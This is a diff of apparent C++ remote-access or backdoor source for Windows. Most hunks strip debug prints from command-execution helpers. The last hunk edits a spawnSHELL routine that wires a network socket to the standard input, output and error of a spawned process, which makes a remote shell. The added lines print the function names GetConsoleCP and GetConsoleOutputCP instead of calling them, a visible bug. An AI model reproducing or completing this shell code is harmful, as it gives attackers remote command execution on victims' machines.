@@ -95,10 +95,9 @@ PROCESS_INFORMATION Exec::createChildProcess(wstring &command)
 {
     wstring command_C = L"/C " + command;
     WCHAR *argv_cmd = &command_C[0]; //arguments
-    wcout << "command exec: " << argv_cmd << endl;
     PROCESS_INFORMATION piProcInfo; 
     STARTUPINFOW siStartInfo;
-    bool bSuccess = FALSE; 
+    BOOL bSuccess = FALSE; 
 
     ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION)); 
     ZeroMemory(&siStartInfo, sizeof(STARTUPINFOW));
@@ -175,7 +174,6 @@ vector<string> Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
         
         wcout << strlen(chBuff) << endl;
 
-        wcout << "test1: "<<ConvertUtf8ToWide((string) chBuff) << endl;
         result.push_back(s);
         s.erase();
 
@@ -184,8 +182,6 @@ vector<string> Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
    
     ZeroMemory(&chBuff, strlen(chBuff));
     
-    //read stderr
-    //cout << "-------------------------------------\n\n" << endl;
 
     while(TRUE)
     {
@@ -256,7 +252,6 @@ vector<string> Exec::executeCommand(wstring command)
         {result_of_command = readFromPipe(piProcInfo);}
 
         //Finally return result_of_command
-        //cout << "RESULT:  " << result_of_command << endl;
         return result_of_command; 
     }
 }
@@ -278,14 +273,17 @@ VOID Exec::spawnSHELL(SOCKET &sock, WCHAR *prog) //Change to WCHAR
     siStartInfo.hStdInput = (HANDLE)sock;
     siStartInfo.hStdOutput = (HANDLE)sock;
     siStartInfo.hStdError = (HANDLE)sock;
-   // siStartInfo.wShowWindow = SW_HIDE;
-   
+
+
+    wcout << GetConsoleCP << endl;
+    wcout << GetConsoleOutputCP << endl;
+
     CreateProcessW(NULL,  //command line 
         prog,     // argv of cmd
         NULL,          // process security attributes 
         NULL,          // primary thread security attributes 
         TRUE,          // handles are inherited 
-        0,             // creation flags 
+        0,             // creation flags  CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT
         NULL,          // use parent's environment 
         NULL,          // use parent's current directory 
         &siStartInfo,  // STARTUPINFO pointer 
